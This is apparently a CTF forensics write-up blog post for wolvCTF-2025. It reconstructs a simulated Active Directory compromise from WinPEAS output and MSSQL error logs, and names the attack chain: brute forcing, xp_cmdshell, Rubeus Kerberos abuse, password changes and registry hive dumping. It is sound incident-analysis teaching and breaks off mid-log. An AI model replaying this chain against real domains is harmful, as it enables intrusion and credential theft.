<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>wolvCTF-2025 | W01f</title><meta name="author" content="Ansh Aggarwal"><meta name="copyright" content="Ansh Aggarwal"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="I participated in wolvCTF-2025, organized by w01verines as a core member of the team InfoSecIITR. Our team secured 11th place globally in the Open Bracket. Here are the Writeups of all the Forensics c">
<meta property="og:type" content="article">
<meta property="og:title" content="wolvCTF-2025">
<meta property="og:url" content="http://w1r3w01f.github.io/2025/03/21/wolvctf-2025/index.html">
<meta property="og:site_name" content="W01f">
<meta property="og:description" content="I participated in wolvCTF-2025, organized by w01verines as a core member of the team InfoSecIITR. Our team secured 11th place globally in the Open Bracket. Here are the Writeups of all the Forensics c">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://w1r3w01f.github.io/images/wolverine-logo.png">
<meta property="article:published_time" content="2025-03-20T18:30:00.000Z">
<meta property="article:modified_time" content="2025-03-27T11:49:40.430Z">
<meta property="article:author" content="Ansh Aggarwal">
<meta property="article:tag" content="Forensics">
<meta property="article:tag" content="DFIR">
<meta property="article:tag" content="Steganography">
<meta property="article:tag" content="File Analysis">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://w1r3w01f.github.io/images/wolverine-logo.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "wolvCTF-2025",
  "url": "http://w1r3w01f.github.io/2025/03/21/wolvctf-2025/",
  "image": "http://w1r3w01f.github.io/images/wolverine-logo.png",
  "datePublished": "2025-03-20T18:30:00.000Z",
  "dateModified": "2025-03-27T11:49:40.430Z",
  "author": [
    {
      "@type": "Person",
      "name": "Ansh Aggarwal",
      "url": "http://w1r3w01f.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://w1r3w01f.github.io/2025/03/21/wolvctf-2025/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"No results found for: ${query}","hits_stats":"${hits} articles found"}},
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'wolvCTF-2025',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/pfp.jpeg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/about"><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/images/wolverine-logo.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">W01f</span></a><a class="nav-page-title" href="/"><span class="site-name">wolvCTF-2025</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/about"><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">wolvCTF-2025</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-03-20T18:30:00.000Z" title="Created 2025-03-21 00:00:00">2025-03-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-03-27T11:49:40.430Z" title="Updated 2025-03-27 17:19:40">2025-03-27</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF-Writeups/">CTF-Writeups</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>I participated in wolvCTF-2025, organized by w01verines as a core member of the team InfoSecIITR. Our team secured 11th place globally in the Open Bracket. Here are the Writeups of all the Forensics challenges I was personally able to solve during the competition.</p>
<p><img src="/./images/wolv_foren.png" alt="Image"></p>
<h2 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h2><h3 id="Active-series-1-2-and-3"><a href="#Active-series-1-2-and-3" class="headerlink" title="Active series (1, 2 and 3)"></a>Active series (1, 2 and 3)</h3><h4 id="Challenge-Description"><a href="#Challenge-Description" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p>Chal 1 -&gt; Oh no! Our beloved <code>wolvctf.corp</code> domain has been infiltrated! How did they manage to break into our domain controller? Please figure out how they got access into the domain controller box, how a shell was achieved, and how a domain account was obtained. </p>
<p>Chal 2 -&gt; The attacker moved laterally throughout our domain. I’m hearing reports from other members of wolvctf.corp that 3 lower level accounts were compromised (excluding the 2 higher level compromised accounts). Figure out which ones these are, and follow the attacker’s steps to collect the flag.</p>
<p>Chal 3 -&gt; Now, it’s time to figure out how this attacker obtained administrator access on our domain! To prove you have retraced the attacker’s steps completely, submit the domain admin’s password as the flag. It’s already in the flag format.</p>
<h4 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h4><p>We were given the complete file system of the compromised system and we need to find the complete attack process and follow the evidences to uncover our flags.<br>Let me first describe the entire process of privelage escalation of the attack in brief.</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">The</span> <span class="string">attacker</span> <span class="string">first</span> <span class="string">uses</span> <span class="string">`WinPEAS`</span> <span class="string">to</span> <span class="string">discover</span> <span class="string">the</span> <span class="string">running</span> <span class="string">services</span> <span class="string">on</span> <span class="string">the</span> <span class="string">system</span> <span class="string">where</span> <span class="string">he</span> <span class="string">founds</span> <span class="string">an</span> <span class="string">open</span> <span class="string">`MSSQL</span> <span class="string">server`</span> <span class="string">so</span> <span class="string">the</span> <span class="string">attacker</span> <span class="string">first</span> <span class="string">tries</span> <span class="string">brute</span> <span class="string">forcing</span> <span class="string">the</span> <span class="string">credentials</span> <span class="string">in</span> <span class="string">case</span> <span class="string">of</span> <span class="string">a</span> <span class="string">weak</span> <span class="string">password</span> <span class="string">but</span> <span class="string">when</span> <span class="string">it</span> <span class="string">fails</span> <span class="string">he</span> <span class="string">tries</span> <span class="string">to</span> <span class="string">leverage</span> <span class="string">the</span> <span class="string">`xp_cmdshell`</span> <span class="string">to</span> <span class="string">get</span> <span class="string">powershell</span> <span class="string">execution.</span> <span class="string">Along</span> <span class="string">with</span> <span class="string">this</span> <span class="string">the</span> <span class="string">WinPEAS</span> <span class="string">also</span> <span class="string">enumerated</span> <span class="string">the</span> <span class="string">`Autologon</span> <span class="string">creds`</span> <span class="string">to</span> <span class="string">and</span> <span class="string">succesfully</span> <span class="string">retrieves</span> <span class="string">password</span> <span class="string">for</span> <span class="string">dan</span> <span class="string">through</span> <span class="string">which</span> <span class="string">he</span> <span class="string">tries</span> <span class="string">to</span> <span class="string">exploit</span> <span class="string">`Kerberos`</span> <span class="string">using</span> <span class="string">`Rubeus`</span> <span class="string">and</span> <span class="string">gets</span> <span class="string">the</span> <span class="string">access</span> <span class="string">as</span> <span class="string">user</span> <span class="string">emily.</span> <span class="string">Next</span> <span class="string">the</span> <span class="string">file</span> <span class="string">directory</span> <span class="string">of</span> <span class="string">emily</span> <span class="string">gives</span> <span class="string">the</span> <span class="string">user</span> <span class="string">the</span> <span class="string">password</span> <span class="string">for</span> <span class="string">james</span> <span class="string">after</span> <span class="string">which</span> <span class="string">he</span> <span class="string">tries</span> <span class="string">to</span> <span class="string">change</span> <span class="string">the</span> <span class="string">password</span> <span class="string">for</span> <span class="string">both</span> <span class="string">emily</span> <span class="string">and</span> <span class="string">patrick</span> <span class="string">giving</span> <span class="string">him</span> <span class="string">the</span> <span class="string">access</span> <span class="string">as</span> <span class="string">patrick</span> <span class="string">as</span> <span class="string">well.</span> <span class="string">Again</span> <span class="string">the</span> <span class="string">file</span> <span class="string">directory</span> <span class="string">of</span> <span class="string">patrick</span> <span class="string">gives</span> <span class="string">him</span> <span class="string">jake&#x27;s</span> <span class="string">password</span> <span class="string">giving</span> <span class="string">access</span> <span class="string">as</span> <span class="string">jake.</span> <span class="string">Now</span> <span class="string">since</span> <span class="string">there</span> <span class="string">was</span> <span class="literal">no</span> <span class="string">possible</span> <span class="string">evidence</span> <span class="string">in</span> <span class="string">the</span> <span class="string">file</span> <span class="string">directory</span> <span class="string">the</span> <span class="string">attacker</span> <span class="string">tries</span> <span class="string">to</span> <span class="string">dump</span> <span class="string">the</span> <span class="string">`registry</span> <span class="string">hives`</span> <span class="string">and</span> <span class="string">get</span> <span class="string">the</span> <span class="string">hash</span> <span class="string">of</span> <span class="string">the</span> <span class="string">domain</span> <span class="string">admin</span> <span class="string">Jessica&#x27;s</span> <span class="string">password</span> <span class="string">which</span> <span class="string">he</span> <span class="string">is</span> <span class="string">able</span> <span class="string">to</span> <span class="string">brute</span> <span class="string">by</span> <span class="string">the</span> <span class="string">group</span> <span class="string">password</span> <span class="string">law</span> <span class="string">in</span> <span class="string">the</span> <span class="string">wolvctf.corp</span> <span class="string">giving</span> <span class="string">the</span> <span class="string">attacker</span> <span class="string">Jessica&#x27;a</span> <span class="string">password</span> <span class="string">and</span> <span class="string">ultimately</span> <span class="string">the</span> <span class="string">`Admin`</span> <span class="string">access.</span></span><br></pre></td></tr></table></figure>

<p>Now lets follow the evidences to retrace this whole process and uncover our three flgs on the way.</p>
<h5 id="Presence-of-MSSQL-server"><a href="#Presence-of-MSSQL-server" class="headerlink" title="Presence of MSSQL server"></a>Presence of MSSQL server</h5><p>We can find the <a target="_blank" rel="noopener" href="https://github.com/peass-ng/PEASS-ng">WinPEAS</a> (Windows Privilege Escalation Awesome Script), a powerful, automated enumeration tool designed to identify privilege escalation vulnerabilities on Windows systems. output file at the location <code>./Users/Public/Documents/</code> where the MSSQL server can be identified running at is default port <code>1433</code> in the enumerated IPV4 connections’ section,</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">Enumerating IPv4 connections</span><br><span class="line">  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name</span><br><span class="line"></span><br><span class="line">  TCP        0.0.0.0               88            0.0.0.0               0               Listening         644             lsass</span><br><span class="line">  TCP        0.0.0.0               135           0.0.0.0               0               Listening         892             svchost</span><br><span class="line">  TCP        0.0.0.0               389           0.0.0.0               0               Listening         644             lsass</span><br><span class="line">  TCP        0.0.0.0               445           0.0.0.0               0               Listening         4               System</span><br><span class="line">  TCP        0.0.0.0               464           0.0.0.0               0               Listening         644             lsass</span><br><span class="line">  TCP        0.0.0.0               593           0.0.0.0               0               Listening         892             svchost</span><br><span class="line">  TCP        0.0.0.0               636           0.0.0.0               0               Listening         644             lsass</span><br><span class="line">  TCP        0.0.0.0               1433          0.0.0.0               0               Listening         3364            C:\Users\mssql_service\MSSQL13.SQLEXPRESS\MSSQL\Binn\sqlservr.exe</span><br><span class="line">  TCP        0.0.0.0               3268          0.0.0.0               0               Listening         644             lsass</span><br><span class="line">  TCP        0.0.0.0               3269          0.0.0.0               0               Listening         644             lsass</span><br><span class="line">  TCP        0.0.0.0               3389          0.0.0.0               0               Listening         1436            svchost</span><br><span class="line">  TCP        0.0.0.0               5985          0.0.0.0               0               Listening         4               System</span><br><span class="line">  TCP        0.0.0.0               9389          0.0.0.0               0               Listening         2340            Microsoft.ActiveDirectory.WebServices</span><br><span class="line">  TCP        0.0.0.0               47001         0.0.0.0               0               Listening         4               System</span><br><span class="line">  TCP        0.0.0.0               49664         0.0.0.0               0               Listening         500             wininit</span><br><span class="line">  TCP        0.0.0.0               49665         0.0.0.0               0               Listening         356             svchost</span><br><span class="line">  TCP        0.0.0.0               49666         0.0.0.0               0               Listening         60              svchost</span><br><span class="line">  TCP        0.0.0.0               49667         0.0.0.0               0               Listening         644             lsass</span><br><span class="line">  TCP        0.0.0.0               49669         0.0.0.0               0               Listening         1652            svchost</span><br><span class="line">  TCP        0.0.0.0               49678         0.0.0.0               0               Listening         644             lsass</span><br><span class="line">  TCP        0.0.0.0               49679         0.0.0.0               0               Listening         644             lsass</span><br><span class="line">  TCP        0.0.0.0               49681         0.0.0.0               0               Listening         644             lsass</span><br><span class="line">  TCP        0.0.0.0               49682         0.0.0.0               0               Listening         2304            spoolsv</span><br><span class="line">  TCP        0.0.0.0               49685         0.0.0.0               0               Listening         636             services</span><br><span class="line">  TCP        0.0.0.0               49688         0.0.0.0               0               Listening         3364            C:\Users\mssql_service\MSSQL13.SQLEXPRESS\MSSQL\Binn\sqlservr.exe</span><br><span class="line">  TCP        0.0.0.0               49693         0.0.0.0               0               Listening         2416            dns</span><br><span class="line">  TCP        0.0.0.0               60689         0.0.0.0               0               Listening         9052            dfsrs</span><br><span class="line">  TCP        127.0.0.1             53            0.0.0.0               0               Listening         2416            dns</span><br><span class="line">  TCP        192.168.187.138       53            0.0.0.0               0               Listening         2416            dns</span><br><span class="line">  TCP        192.168.187.138       139           0.0.0.0               0               Listening         4               System</span><br><span class="line">  TCP        192.168.187.138       58485         52.159.126.152        443             Established       60              svchost</span><br><span class="line">  TCP        192.168.187.138       60700         192.168.187.128       1433            Established       8532            C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</span><br><span class="line">  TCP        192.168.231.128       53            0.0.0.0               0               Listening         2416            dns</span><br><span class="line">  TCP        192.168.231.128       139           0.0.0.0               0               Listening         4               System</span><br></pre></td></tr></table></figure>

<h5 id="MSSQL-server-credential-brute-forcing"><a href="#MSSQL-server-credential-brute-forcing" class="headerlink" title="MSSQL server credential brute forcing"></a>MSSQL server credential brute forcing</h5><p>We can find the MSSQL (Microsoft SQL Server 2016 SP2) <code>ERRORLOG</code> at the following location <code>./Users/mssql_service/MSSQL13.SQLEXPRESS/MSSQL/Log/</code> where we find the server setup logs (normal) followed by a a series of failed login attempts giving the bruteforce and also the first part of the flag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">2025-03-18 12:29:13.42 Server      The SQL Server Network Interface library could not register the Service Principal Name (SPN) [ MSSQLSvc/DC01.wolvctf.corp:1433 ] <span class="keyword">for</span> the SQL Server service. Windows <span class="built_in">return</span> code: 0x2098, state: 15. Failure to register a SPN might cause integrated authentication to use NTLM instead of Kerberos. This is an informational message. Further action is only required <span class="keyword">if</span> Kerberos authentication is required by authentication policies and <span class="keyword">if</span> the SPN has not been manually registered.</span><br><span class="line">2025-03-18 12:29:14.01 Server      [ERROR] Failure <span class="keyword">while</span> enumerating counters: 0xc0000bdb (d:\b\s3\sources\sql\ntdbms\hekaton\engine\perfctrs\hkengperfctrs.cpp : 984 - <span class="string">&#x27;enumerateCountersAndAddToQuery&#x27;</span>)</span><br><span class="line">2025-03-18 12:29:14.04 Server      Software Usage Metrics is disabled.</span><br><span class="line">2025-03-18 13:28:27.74 spid52      Using <span class="string">&#x27;dbghelp.dll&#x27;</span> version <span class="string">&#x27;4.0.5&#x27;</span></span><br><span class="line">2025-03-18 19:51:14.50 Logon       Error: 18456, Severity: 14, State: 5.</span><br><span class="line">2025-03-18 19:51:14.50 Logon       Login failed <span class="keyword">for</span> user <span class="string">&#x27;root&#x27;</span>. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]</span><br><span class="line">2025-03-18 19:51:15.13 Logon       Error: 18456, Severity: 14, State: 5.</span><br><span class="line">2025-03-18 19:51:15.13 Logon       Login failed <span class="keyword">for</span> user <span class="string">&#x27;test&#x27;</span>. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]</span><br><span class="line">2025-03-18 19:51:15.74 Logon       Error: 18456, Severity: 14, State: 5.</span><br><span class="line">2025-03-18 19:51:15.74 Logon       Login failed <span class="keyword">for</span> user <span class="string">&#x27;admin&#x27;</span>. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]</span><br><span class="line">2025-03-18 19:51:16.32 Logon       Error: 18456, Severity: 14, State: 5.</span><br><span class="line">2025-03-18 19:51:16.32 Logon       Login failed <span class="keyword">for</span> user <span class="string">&#x27;bruteforcing&#x27;</span>. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]</span><br><span class="line">2025-03-18 19:51:17.00 Logon       Error: 18456, Severity: 14, State: 5.</span><br><span class="line">2025-03-18 19:51:17.00 Logon       Login failed <span class="keyword">for</span> user <span class="string">&#x27;this&#x27;</span>. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]</span><br><span class="line">2025-03-18 19:51:17.85 Logon       Error: 18456, Severity: 14, State: 5.</span><br><span class="line">2025-03-18 19:51:17.85 Logon       Login failed <span class="keyword">for</span> user <span class="string">&#x27;is&#x27;</span>. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]</span><br><span class="line">2025-03-18 19:51:18.43 Logon       Error: 18456, Severity: 14, State: 5.</span><br><span class="line">2025-03-18 19:51:18.43 Logon       Login failed <span class="keyword">for</span> user <span class="string">&#x27;the&#x27;</span>. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]</span><br><span class="line">2025-03-18 19:51:19.05 Logon       Error: 18456, Severity: 14, State: 5.</span><br><span class="line">2025-03-18 19:51:19.05 Logon       Login failed <span class="keyword">for</span> user <span class="string">&#x27;first&#x27;</span>. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]</span><br><span class="line">2025-03-18 19:51:19.69 Logon       Error: 18456, Severity: 14, State: 5.</span><br><span class="line">2025-03-18 19:51:19.69 Logon       Login failed <span class="keyword">for</span> user <span class="string">&#x27;part&#x27;</span>. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]</span><br><span class="line">2025-03-18 19:51:20.31 Logon       Error: 18456, Severity: 14, State: 5.</span><br><span class="line">2025-03-18 19:51:20.31 Logon       Login failed <span class="keyword">for</span> user <span class="string">&#x27;w&#x27;</span>. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]</span><br><span class="line">2025-03-18 19:51:20.86 Logon       Error: 18456, Severity: 14, State: 5.</span><br><span class="line">2025-03-18 19:51:20.86 Logon       Login failed <span class="keyword">for</span> user <span class="string">&#x27;c&#x27;</span>. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]</span><br><span class="line">2025-03-18 19:51:21.68 Logon       Error: 18456, Severity: 14, State: 5.</span><br><span class="line">2025-03-18 19:51:21.68 Logon       Login failed <span class="keyword">for</span> user <span class="string">&#x27;t&#x27;</span>. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]</span><br><span class="line">2025-03-18 19:51:22.30 Logon       Error: 18456, Severity: 14, State: 5.</span><br><span class="line">2025-03-18 19:51:22.30 Logon       Login failed <span class="keyword">for</span> user <span class="string">&#x27;f&#x27;</span>. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]</span><br><span class="line">2025-03-18 19:51:23.12 Logon       Error: 18456, Severity: 14, State: 5.</span><br><span class="line">2025-03-18 19:51:23.12 Logon       Login failed <span class="keyword">for</span> user <span class="string">&#x27;&#123;&#x27;</span>. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]</span><br><span class="line">2025-03-18 19:51:23.96 Logon       Error: 18456, Severity: 14, State: 5.</span><br><span class="line">2025-03-18 19:51:23.96 Logon       Login failed <span class="keyword">for</span> user <span class="string">&#x27;d&#x27;</span>. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]</span><br><span class="line">2025-03-18 19:51:24.56 Logon       Error: 18456, Severity: 14, State: 5.</span><br><span class="line">2025-03-18 19:51:24.56 Logon       Login failed <span class="keyword">for</span> user <span class="string">&#x27;0&#x27;</span>. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]</span><br><span class="line">2025-03-18 19:51:25.22 Logon       Error: 18456, Severity: 14, State: 5.</span><br><span class="line">2025-03-18 19:51:25.22 Logon       Login failed <span class="keyword">for</span> user <span class="string">&#x27;n&#x27;</span>. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]</span><br><span class="line">2025-03-18 19:51:25.82 Logon       Error: 18456, Severity: 14, State: 5.</span><br><span class="line">2025-03-18 19:51:25.82 Logon       Login failed <span class="keyword">for</span> user <span class="string">&#x27;t&#x27;</span>. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]</span><br><span class="line">2025-03-18 19:51:26.49 Logon       Error: 18456, Severity: 14, State: 5.</span><br><span class="line">2025-03-18 19:51:26.49 Logon       Login failed <span class="keyword">for</span> user <span class="string">&#x27;_&#x27;</span>. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]</span><br><span class="line">2025-03-18 19:51:27.21 Logon       Error: 18456, Severity: 14, State: 5.</span><br><span class="line">2025-03-18 19:51:27.21 Logon       Login failed <span class="keyword">for</span> user <span class="string">&#x27;3&#x27;</span>. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]</span><br><span class="line">2025-03-18 19:51:27.93 Logon       Error: 18456, Severity: 14, State: 5.</span><br><span class="line">2025-03-18 19:51:27.93 Logon       Login failed <span class="keyword">for</span> user <span class="string">&#x27;n&#x27;</span>. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]</span><br><span class="line">2025-03-18 19:51:28.60 Logon       Error: 18456, Severity: 14, State: 5.</span><br><span class="line">2025-03-18 19:51:28.60 Logon       Login failed <span class="keyword">for</span> user <span class="string">&#x27;4&#x27;</span>. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]</span><br><span class="line">2025-03-18 19:51:29.11 Logon       Error: 18456, Severity: 14, State: 5.</span><br><span class="line">2025-03-18 19:51:29.11 Logon       Login failed <span class="keyword">for</span> user <span class="string">&#x27;b&#x27;</span>. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]</span><br><span class="line">2025-03-18 19:51:29.64 Logon       Error: 18456, Severity: 14, State: 5.</span><br><span class="line">2025-03-18 19:51:29.64 Logon       Login failed <span class="keyword">for</span> user <span class="string">&#x27;l&#x27;</span>. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]</span><br><span class="line">2025-03-18 19:51:30.29 Logon       Error: 18456, Severity: 14, State: 5.</span><br><span class="line">2025-03-18 19:51:30.29 Logon       Login failed <span class="keyword">for</span> user <span class="string">&#x27;3&#x27;</span>. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]</span><br><span class="line">2025-03-18 19:51:55.62 spid54      Configuration option <span class="string">&#x27;show advanced options&#x27;</span> changed from 1 to 1. Run the RECONFIGURE statement to install.</span><br><span class="line">2025-03-18 19:51:55.63 spid54      Configuration option <span class="string">&#x27;xp_cmdshell&#x27;</span> changed from 1 to 1. Run the RECONFIGURE statement to install.</span><br><span class="line">2025-03-18 19:51:58.29 spid54      Configuration option <span class="string">&#x27;xp_cmdshell&#x27;</span> changed from 1 to 0. Run the RECONFIGURE statement to install.</span><br><span class="line">2025-03-18 19:51:58.33 spid54      Configuration option <span class="string">&#x27;show advanced options&#x27;</span> changed from 1 to 0. Run the RECONFIGURE statement to 